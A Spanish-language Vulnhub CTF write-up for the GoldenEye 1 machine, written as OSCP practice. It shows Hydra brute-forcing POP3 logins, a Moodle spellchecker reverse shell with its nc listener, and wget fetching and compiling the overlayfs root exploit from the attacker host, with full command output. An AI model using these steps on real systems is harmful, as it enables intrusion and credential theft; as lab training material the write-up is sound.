---
title: GoldenEye1 Writeup - Vulnhub
date: 2025-02-16
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, GoldenEye1, OSCP Prep, Moodle]
image:
  path: /assets/img/commons/vulnhub/GoldenEye1/portada.png
---

Anterior [*OSCP Lab 7*](https://lvs3c.github.io/posts/OSCP-DeRPnStiNK/)

¡Saludos!

**`OSCP Lab 8`**

En este writeup, realizaremos la máquina [**GoldenEye 1**](https://www.vulnhub.com/entry/goldeneye-1,240/). 

Se trata de una máquina **Linux** en la cual veremos:
- **Enumeración de servicios**.
- **Url decode** para autenticar panel de login.
- **Hydra** para fuerza bruta sobre `POP3`{: .filepath}.
- **POP3 - Validar mails** de los usuarios y obtener información.
- **CMS Moodle** pivoting de usuario, logrando ser admin.
- **Vulnerar Moodle** mediante funcionalidad `spell check`{: .filepath}.
- Y por último, **Exploit overlayfs** para convertirnos en root y obtener las flag del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.21     00:0c:29:4f:51:02       VMware, Inc.
10.11.12.200    00:50:56:ef:e9:97       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.712 seconds (94.40 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.21
PING 10.11.12.21 (10.11.12.21) 56(84) bytes of data.
64 bytes from 10.11.12.21: icmp_seq=1 ttl=64 time=0.484 ms

--- 10.11.12.21 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.484/0.484/0.484/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.21 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 20:36 -03
Nmap scan report for 10.11.12.21
Host is up (0.0063s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown
MAC Address: 00:0C:29:4F:51:02 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 9.53 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p25,80,55006,55007 -sCV 10.11.12.21 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 20:38 -03
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan

PORT      STATE SERVICE     VERSION
25/tcp    open  smtp
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| fingerprint-strings:
|   Hello:
|     220 ubuntu GoldentEye SMTP Electronic-Mail agent
|_    Syntax: EHLO hostname
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA SASL(PLAIN) USER RESP-CODES UIDL TOP STLS AUTH-RESP-CODE
|_ssl-date: TLS randomness does not represent time
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.94SVN%I=7%D=2/16%Time=67B27721%P=x86_64-pc-linux-gnu%r(H
SF:ello,4D,"220\x20ubuntu\x20GoldentEye\x20SMTP\x20Electronic-Mail\x20agen
SF:t\r\n501\x20Syntax:\x20EHLO\x20hostname\r\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.49 seconds
```

El informe de `Nmap` nos revela:
- Puerto `25` servidor `smtp`.
- Puerto `80` servidor `Apache httpd 2.4.7`.
- Puerto `55006` servidor `ssl`.
- Puerto `55007` servidor `Dovecot pop3d`.


### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.21/
http://10.11.12.21/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.11.12.21], Script, Title[GoldenEye Primary Admin Server]
```

Validamos la web y su código.

![web](/assets/img/commons/vulnhub/GoldenEye1/web.png){: .center-image }

Encontramos una cadena cifrada y un path para loguearnos. Validamos luego de enumerar directorios y archivos.

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p80 --script http-enum 10.11.12.21 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 20:51 -03
Nmap scan report for 10.11.12.21
Host is up (0.00030s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

No nos trajo información, probamos con `gobuster`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://10.11.12.21/ -e -x php,txt,html,bak,bkp -b 403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.21/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,bak,bkp,php,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.21/index.html           (Status: 200) [Size: 252]
Progress: 7642998 / 7643004 (100.00%)
===============================================================
Finished
===============================================================
```

Tampoco trajo información.

Procedemos a usar `cyberchef` para url decodear la cadena encontrada.

![urldecode](/assets/img/commons/vulnhub/GoldenEye1/urldecode.png){: .center-image }

Nos logueamos al panel en `/sev-home` con `boris:InvincibleHack3r`.

![sev-home](/assets/img/commons/vulnhub/GoldenEye1/sev-home.png){: .center-image }

Validando la web encontramos el mensaje.

![supervisors](/assets/img/commons/vulnhub/GoldenEye1/supervisors.png){: .center-image }


### POP3 - 55007

Teniendo los usuarios, vamos a proceder a utilizar `hydra` para fuerza bruta sobre `POP3`.

```bash
❯ hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 10.11.12.21 -s 55007 pop3
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-17 23:13:55
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.11.12.21:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
[55007][pop3] host: 10.11.12.21   login: boris   password: secret1!
[STATUS] attack finished for 10.11.12.21 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-17 23:16:28

❯ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f 10.11.12.21 -s 55007 pop3
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-17 23:19:14
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.11.12.21:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[55007][pop3] host: 10.11.12.21   login: natalya   password: bird
[STATUS] attack finished for 10.11.12.21 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-17 23:21:09
```

Tenemos:
- Usuario boris : secret1!
- Usuario natalya : bird

[**Lista de comandos pop3**](https://www.shellhacks.com/retrieve-email-pop3-server-command-line/)

Nos logueamos por telnet y luego netcat (para tener dos maneras distintas de conectarnos) al puerto pop3 (55007) con las credenciales obtenidas, listamos los mails pendientes de cada usuario.

Usuario Boris.

```bash
Trying 10.11.12.21...
Connected to 10.11.12.21.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
list
+OK 3 messages:
1 544
2 373
3 921
.
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.
```

Usuario Natalya. Usamos nc.

```bash
❯ nc 10.11.12.21 55007
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.

-ERR Unknown command:
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

Tenemos información sobre otro usuario y su clave, además de un dns a agregar junto con su url.

Añadimos la entrada a /etc/hosts.

```bash
echo "10.11.12.21\tsevernaya-station.com" >> /etc/hosts
```

Validamos la web.

![moodle](/assets/img/commons/vulnhub/GoldenEye1/moodle.png){: .center-image }

Dentro encontramos el nombre de otro usuario.

![doak](/assets/img/commons/vulnhub/GoldenEye1/doak.png){: .center-image }

Usamos nuevamente `hydra` sobre `doak`{: .filepath} y encontramos la clave.

```bash
❯ hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f 10.11.12.21 -s 55007 pop3
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-18 13:07:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://10.11.12.21:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 72.00 tries/min, 144 tries in 00:02h, 78 to do in 00:02h, 16 active
[55007][pop3] host: 10.11.12.21   login: doak   password: goat
[STATUS] attack finished for 10.11.12.21 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-18 13:09:23
```

Validamos los mails.

```bash
❯ nc 10.11.12.21 55007
+OK GoldenEye POP3 Electronic-Mail System
user doak
+OK
pass goat
+OK Logged in.
list
+OK 1 messages:
1 606
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
```

Ingresamos al panel con los datos brindados.

![drdoak](/assets/img/commons/vulnhub/GoldenEye1/drdoak.png){: .center-image }

Encontramos un archivo txt en los archivos privados.

![secret](/assets/img/commons/vulnhub/GoldenEye1/secret.png){: .normal }
![secretimg](/assets/img/commons/vulnhub/GoldenEye1/secretimg.png){: .normal }
![secretimg2](/assets/img/commons/vulnhub/GoldenEye1/secretimg2.png){: .normal }


Descargamos la imagen y usamos la herramienta `exiftool` para ver los metadatos.

```bash
❯ exiftool for-007.jpg
ExifTool Version Number         : 12.57
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2018:04:24 21:40:02-03:00
File Access Date/Time           : 2025:02:18 13:17:32-03:00
File Inode Change Date/Time     : 2025:02:18 13:17:32-03:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
```

Encontramos una cadena en base64, la decodeamos y tenemos la clave de `admin`{: .filepath}.

```bash
❯ echo eFdpbnRlcjE5OTV4IQ== | base64 -d; echo
xWinter1995x!
```

Ingresamos al panel como admin.

![adminpanel](/assets/img/commons/vulnhub/GoldenEye1/adminpanel.png){: .center-image }

## Explotación

---

Ya tenemos acceso al panel como administrador, lo que haremos ahora es lanzarnos una reverse shell mediante la funcionalidad `spell check`.

Configuramos la reverse shell.

![rs](/assets/img/commons/vulnhub/GoldenEye1/rs.png){: .center-image }

Modificamos para que el spell no sea el por defecto (google) sino `PSpellShell`.

![tiny](/assets/img/commons/vulnhub/GoldenEye1/tiny.png){: .normal }

Abrimos un nuevo blog y apretamos el boton de comprobación de texto, esto nos lanza la reverse shell.

![rsok](/assets/img/commons/vulnhub/GoldenEye1/rsok.png){: .center-image }


```bash
❯ sudo nc -nlvp 8080
listening on [any] 8080 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.21] 55651
bash: cannot set terminal process group (1114): Inappropriate ioctl for device
bash: no job control in this shell
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ whoami
whoami
www-data
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$
```

## Escalación de privilegios

El sistema es Ubuntu 14.04, el cual está expuesto a muchas vulnerabilidades, vamos a usar `overlayfs`.

[Exploit](https://www.exploit-db.com/exploits/37292)

El problema que tenemos, es que no existe `gcc` para compilar en la máquina víctima, pero sí `cc` que es un compilador más viejo, el cual usaremos.

Debemos cambiar en el exploit la línea que llama a `gcc`{: .filepath} y reemplazarla por `cc`{: .filepath}.

![cc](/assets/img/commons/vulnhub/GoldenEye1/cc.png){: .normal }

Nos transferimos el exploit, lo compilamos y ejecutamos, obtenemos root.

```bash
www-data@ubuntu:/tmp$ wget 10.11.12.10/37292_cc.c
--2025-02-18 10:44:37--  http://10.11.12.10/37292_cc.c
Connecting to 10.11.12.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5120 (5.0K) [text/x-csrc]
Saving to: '37292_cc.c'

100%[======================================>] 5,120       --.-K/s   in 0s

2025-02-18 10:44:37 (903 MB/s) - '37292_cc.c' saved [5120/5120]

www-data@ubuntu:/tmp$ cc 37292_cc.c -o ofs
37292_cc.c:94:1: warning: control may reach end of non-void function
      [-Wreturn-type]
}
^
37292_cc.c:106:12: warning: implicit declaration of function 'unshare' is
      invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292_cc.c:111:17: warning: implicit declaration of function 'clone' is invalid
      in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292_cc.c:117:13: warning: implicit declaration of function 'waitpid' is
      invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292_cc.c:127:5: warning: implicit declaration of function 'wait' is invalid in
      C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
www-data@ubuntu:/tmp$ ls
37292_cc.c  dirty  ofs  vmware-root
www-data@ubuntu:/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cd /root
# ls
# ls -la
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
# cat .flag.txt
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/

#
```

Vamos al directorio `/006-final/xvf7-flag/` y validamos la flag.

![flag](/assets/img/commons/vulnhub/GoldenEye1/flag.png){: .center-image }

Hope it helps!